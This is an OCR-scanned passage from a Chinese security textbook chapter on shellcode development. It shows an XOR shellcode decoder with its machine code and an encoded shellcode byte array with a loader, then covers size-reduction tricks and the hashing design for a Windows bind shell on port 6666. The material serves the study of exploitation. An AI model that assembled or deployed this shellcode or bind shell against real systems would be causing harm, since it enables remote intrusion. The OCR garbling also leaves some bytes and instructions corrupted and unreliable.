void main()
-asm
addeax，0x14//越过decoder，记录shellcode的起始地址
xorecx,ecx
decode_loop:
mov bl,[eax+ecx]
xorbl，0x44//这里用0x44作为key，如编码的key改变，这里也要相应
//改变
mov[eax+ecx],bl
inc ecx
cmpb1，0x90//在ahe11code末尾放上一个字节的0x90作为结束符
jne decode_loop
对于这个解码器，有以下需要注意的地方。
（1）解码器不能单独运行，需要用VC6.0将其编译，然后用OllyDbg提取出二进制的机
器代码，联合经过编码的shellcode一起执行。
（2）解码器默认在shellcode开始执行时，EAX已经对准了shellcode的起始位置。
（3）解码器将认为shellcode的最后一个字节为0x90，所以在编码前要注意给原始shellcode
多加一个字节的0x90作为结尾，否则会产生错误。
将汇编指令转换为机器代码，如表3-5-1所示。
101
---
## Page 127
0
day
表3-5-1
将汇编指令转换为机器代码
安
机器代码
汇编指令
说
多
全
x83lxC0x14"
ADD EAX,14 h
跃过decoder代码区
：
"x33lxC9"
XOR ECX.ECX
ECX被当作循环控制变量
软
件
"x8Alx1Cx08"
MOV BL,[EAX+ECX)
漏
这里key=Ox44，如果cncode使用新key，这里需要做
"x80xF3x44
XOR BL,44h
洞
相应的修改
分
"x88x1Cx08"
MOV[EAX+ECX].BL
析
"x41"
INCECX
技
术
"x80xFBx90"
CMPBL,90 h
将0x90作为shellcode结束的标识符
"x75xF1"
JNZ
第
最后，将这20个字节的解码指令与经过编码的shellcode一起送入装载器测试。
2
版
char final_sc_441]=
"\x83\xC0\x14"
//ADD EAX,14H
"\x33\xC9"
//XOR ECX,ECX
"\X8A\x1C\x08"
//MOV BL,BYTE PTR DS:[EAX+ECX]
\x80\xF3\x44*
//XOR BL,44H
//notice0x44istakenas tempkeytodecode
"\x88\x1C\x08"
//MOVBYTEPTRDS:[EAX+ECX],BL
"\x41"
//INC ECX
//CMPBL,90H
"\x75\xF1*
//JNZSHORTdecoder.00401034
"1xb8\x2c1x2e1x4e\x7c\x5a\x2c|x27\xcd\x951x0b\x2clx761x30\xd51x48*
"\xcf\xb0\xc9\x3a\xb0\x77\x9f\xf3\x40\x6f\xa7\x22\xff\x77\x76\x17
"\x2c\x31\x37\x21\x36\x10\x77\x96\x20\xcf\x1e\x74\xcf\x0f\x48\xcf
"\x0d\x581xcf\x4d/xcf\x2d\x4c\xe9\x79\x2elx4e/x7c\x5a\x311x41\xd1
"\xbb\x13\xbc\xd1\x24\xcf\x011x78\xcf\x08\x41\x3c\x47\x89\xcf\x1d
"\x64\x47\x99\x77\xbb\x03\xcf\x70/xff\x47\xb1\xdd\x4b\xfa\x42\x7e*
\x80\x30\x4c\x85\x8e\x43\x47\x94\x02\xaf\xb5\x7f\x101x60\x58\x31
"\xa0\xcf\x1d\x60\x47\x99\x22\xcf\x78\x3f\xcf\x1d\x58\x47\x99\x47*
"\x68\xff\xd11x1b\xef\x13\x25/x79\x2e\x4e\x7c/x5a\x31\xed\x77\x9f
\x17\x2c\x33\x21\x37\x30\x2c\x22\x25\x2d\x28\xcf\x80\x17\x14\x14
"\x17\xbb\x13\xb8\x17\xbb\x13\xbc\xd4*;
void main()
asm
leaeax,final_sc_44
pusheax
ret
102
---
## Page 128
第
3
喜
编译运行之，看到熟悉的failwest了吗？
开
以上是一个最简单的shellcode编码过程，用于演示开发shellcode编码器、解码器的原理
发
和方法。实际上，除了自己开发之外，一个更简单的给shellcode编码、解码的方法是利用
shellcode
MetaSploit。目前，MetaSploit3.0所提供的编码和解码算法总共有17种（包括本节介绍的单字
节异或算法），已经能够满足绝大多数安全测试的需要。
3.6为shellcode“减肥"
的
艺
术
3.6.1shellcode瘦身大法
除了对内容的限制之外，shellcode的长度也将是其优劣性的重要衡量标准。短小精悍的
shellcode除了可以宽松地布置在大缓冲区之外，还可以塞进狭小的内存缝隙，适应多种多样的
缓冲区组织策略，具有更强的通用性。
用尽可能短的代码篇幅在shellcode中实现丰富的功能需要很多编程技巧，我们这一节就专
门讨论这类用于精简代码篇幅的编程技巧。
本节将以实现一个能够绑定端口等待外来连接的shellcode为例，来介绍用于精简代码篇幅
的编程技巧。这些技巧和思路将为开发高级的shellcode带来很多启示和帮助。
shellcode”。在征得Dafydd本人的同意后，我们对这篇文章进行了重新加工和组织，希望对
shellcode开发感兴趣的朋友能够有所帮助。
本节将涉及比较多的汇编知识和技术，供有一定汇编语言开发基础的朋友学习参考。如果
您想专注于漏洞分析和利用方面的知识，也可跳过本节，直接学习后续的章节。
当shellcode的尺寸缩短到一定程度之后，每减少一个字节，我们都需要额外做更多努力。
在实际开发之前，首先我们应当清楚shellcode中的指令是用什么办法“节省”出来的。
1.勤俭持家一精挑细选“短”指令
x86指令集中指令所对应的机器码的长短是不一样的，有时候功能相似的指令的机器码长
度差异会很大。这里给出一些非常有用的单字节指令。
xchgeax，reg交换eax和其他寄存器中的值
lodsd把esi指向的一个dword装入eax，并且增加esi
lodsb把esi指向的一个byte装入al，并且增加esi
stosd
stosb
pushad/popad从栈中存储/恢复所有寄存器的值
cdq用edx把eax扩展成四字。这条指令在eax<0x80000000时可用作movedx
NULL
103
---
## Page 129
day
0
2.事半功倍一“复合”指令功能强
安
有时候我们可以把两件事情用一条指令完成，例如，用xchg、lods或者stos。
全
3.妙用内存一另类的API调用方式
软
有些API中许多参数都是NULL，通常的做法是多次向栈中压入NULL。如果我们换一个
件
思路，把栈中的一大片区域一次性全部置为NULL，在调用API的时候就可以只压入那些非
漏
NULL的参数，从而节省出许多压栈指令。
洞
分
我们经常会遇到API中需要一个很大的结构体做参数的情况。通过实验可以发现，大
析
多数情况下，健壮的API都可以允许两个结构体相互重叠，尤其是当一个参数是输入结构
技
体[in]，另一个用作接收的结构体[out]时，如果让参数指向同一个[in]结构体，函数往往也
术
（第
[out]结构体的代码。
2
4.色既是空，空既是色一代码也可以当数据
版
很多Windows的API都会要求输入参数是一种特定的数据类型，或者要求特定的取值区
间。虽然如此，通过实验我们发现，大多数API出于函数健壮性的考虑，在实现时已经对非法
参数做出了正确处理。例如，我们经常见到API的参数是一个结构体指针和一个指明结构体大
小的值，而用于指明结构体大小的参数只要足够大，就不会对函数执行造成任何影响。如果在
编写shellcode时，发现栈区恰好已经有一个很大的数值，哪怕它是指令码，我们也可以把它的
值当成数据直接使用，从而节省掉一条参数压栈的指令。总之，在开发shellcode的时候，代码
可以是数据，数据也可以是代码！
3.变废为宝一调整栈顶回收数据
普通程序员不会直接与系统栈打交道，通常与栈沟通的总是编译器。在编译器看来，栈仅
仅是用来保护函数调用断点、暂存函数输入参数和返回值等的场所。但是，作为一个shellcode
的开发人员，必须富有更多的想象力。栈顶之上的数据在逻辑上视为废弃数据，但其物理内容
往往并未遭到破坏。如果栈顶之上有需要的数据，不妨调整esp的值将栈顶抬高，把它们保护
起来以便后面使用，这样能节省出很多用作数据初始化的指令。这与我们前边讲的抬高栈顿保
护shellcode有相似之处。
6.打破常规一巧用寄存器
按照默认的函数调用约定，在调用API时有些寄存器（如EBP、ESI、EDI等）总是被保
存在栈中。把函数调用信息存在寄存器中而不是存在栈中会给shellcode带来很多好处。比如大
多数函数的运行过程中都不会使用EBP寄存器，故我们可以打破常规，直接使用EBP来保存
数据，而不是把数据存在栈中。
一些x86的寄存器有着自己特殊的用途。有的指令要求只能使用特定的寄存器：有的指令
使用特定寄存器时的机器码要比使用其他寄存器短。此外，如果寄存器中含有调用函数时需要
的数值，尽管不是立刻要调用这些函数，可能还是要考虑提前把寄存器压入栈内以备后用，以
免到时候还得另用指令重新获取。
104
---
## Page 130
第
7.取其精华，去其糖粕一永恒的压缩法宝，hash
3
实用的shellcode通常需要超过200甚至300字节的机器码，所以对原始的二进制shellcode
章
进行编码或压缩是很值得的。上节实验中在搜索API函数名时，并没有在shellcode中存储原
开
始的函数名，而是使用了函数名的摘要。在需要的API比较多的情况下，这样能够节省不少
发
shellcode的篇幅。
shellcode
3.6.2选择恰当的hash算法
我们想要在shellcode中实现的功能如下。
的
（1）绑定一个shell到6666端口。
艺
（2）充许外部的网络连接使用这个shell。
术
（3）程序能够正常退出。
这个shellcode应当具有较强的通用性，能够在WindowsNT4、Windows2000、WindowsXP
和Windows2003上运行。开发过程中需要解决的问题实际上有这样两个。
（1）在不同的操作系统版本中，用通用的方法定位所需AP函数的地址。
（2）调用这些APl，完成shellcode的功能。
定位API的方法和思路已经在上节实验中介绍过了，这里准备进一步优化搜索API时使用
的hash算法，以精简shellcode。
实现bindshell需要的函数包括。
1.kemel32.dll中的导出函数
LoadLibraryA用来装载ws2_32.d11。
CreateProcessA用来为客户端创建一个shell命令窗口
ExitProcess用于程序的正常退出.
2.ws2_32.dll中的导出函数
WSAStartup
需要初始化winsock。
WSASocketA
创建套结字。
bind
绑定套结字到本地端口。
listen
监听外部连接。
accept
处理一个外部连接。
我们将搜索相关库函数的导出表，查找导出表中的函数名，最终确定函数入口地址。在搜
索操作中将采用比较hash摘要的方法，而不是直接比较函数名。其中，选择合适的hash算法
将是这种方法的关键，也是缩短shellcode代码的关键。
下面是在选择这种算法时所考虑的因素。
其实这个因素在一些情况下可以适当放宽。例如，当被搜索的函数排在碰撞函数名的第一
个时，即使存在hash碰撞，我们仍然知道最先搜到的就是所需要的函数，故这种碰撞是可以
容忍的。
105
---
## Page 131
0
day
（2）函数名经过hash后得到的摘要应该最短。
安
可以认为单字节（8bit）的摘要是最佳的。kermel32.dll的导出表里有超过900个函数，8bit
全：
的摘要有256种可能，考虑到hash碰撞可以部分容忍，经过精心选择hash算法，这个摘要长
度应该可行。如果把hash值缩短到小于8bit，则需要额外的代码处理摘要的字节对齐问题，这
软
个代价相对压缩摘要而节省出的空间来说，是得不偿失的（我们上节实验中的摘要为4字节，
件
漏
是本节摘要长度的4倍）。
洞
（3）hash算法实现所需的代码篇幅最短。
分
这里需要牢记于心，x86中实现相似功能的操作码长短往往相差很多，例如：
析
技
术
1xc0\xc1\x02;rol
cl.
2
（第
x66\xc1\xc1\x02
:rolcx,
2
所以，一个需要完成很多操作的hash函数的机器码在经过精心优化选取最恰当的指令后，
2
是有很大的“减肥”空间的。
版
（4）经过hash后的摘要可等价于指令的机器码，即把数据也当做代码使用。
如果所需函数的函数名后经过hash后得到的摘要等价于nop指令，即“准nop指令”，那
么就可以把这些hash值放在shellcode的开头。这样布置shellcode可以省去跳过这段摘要的跳
转指令，处理器可以直接把这段hash摘要当作指令，顺序执行过去。此时，数据和代码实际
上是重叠的。
注意：“准nop”指令并不仅仅是指0x90，而是相对于实际代码的上下文而言的，是
指不影响后续代码执行的指令。比如此时ECX中的值无关紧要，那么INCECX对于
整个shellcode来说就相当于“不疼不痒”的nop指令。
考虑到会有很多hash算法供我们选择，您可以写一段程序来测试这些算法中哪些最符合
要求。首先选取一部分hash需要的x86指令（xor、add、rol等）用来构造hash算法，然后把
按照hash碰撞、摘要最短、算法精炼这三条标准对算法进行筛选。
在可被两条双字节指令实现的hash算法中，可以找到6种符合基本条件。经过人工核查，
发现其中一种hash算法恰能够满足代码和数据重叠的要求。
题外话：尽管这里的hash算法适用于目前所有基于NT的Windows版本，但是如果
将来的Windows版本在动态链接库中引进新的导出函数，打破了容忍hash碰撞的限
制（新导出函数的hash值与我们所需函数的hash值一样，并且在我们所需的函数之
前定义），都么我们就得重新寻找新的hash算法了。
最终的hash算法如下（esi指向当前被hash的函数名；edx被初始化为null）。
hash_loop:
lodsb
把函数名中的一个字符装入al，并且esi+1，指向函数
：名中下一个字符
106
---
## Page 132
第
xor
al，0x71：用0x71异或当前的字符
3
qns
dl，al；更新dl中的hash值
章
cmp
al，0x71；继续循环，直到遇到字符串的结尾nul1
jne
hash_loop
开
通过这个hash函数，原函数名、hash值、hash值对应的指令三者之间的关系如表3-6-1
发
所示。
shellcode
表3-6-1原函数名、hash值及其对应指令的关系
函数名
hash后得到的摘要
摘要对应的等价于nop的指令
LoadLibraryA
0x59
pop ecx
的
艺
CreateProcessA
18x0
术
ExitProcess
0xc9
WSAStartup
Epxo
or ecx,0x203062d3
WSASocketA
0x62